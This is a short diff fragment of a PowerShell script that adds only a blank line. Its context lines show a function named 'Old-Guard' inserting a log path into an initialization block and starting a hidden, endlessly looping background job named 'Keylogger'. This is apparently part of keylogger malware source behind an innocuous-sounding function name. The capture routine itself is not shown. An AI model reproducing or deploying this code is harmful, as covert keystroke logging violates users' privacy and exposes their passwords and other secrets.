@@ -194,6 +194,7 @@ function Old-Guard {
             }
         }
 
+
     $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))
 
     Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name Keylogger | Out-Null
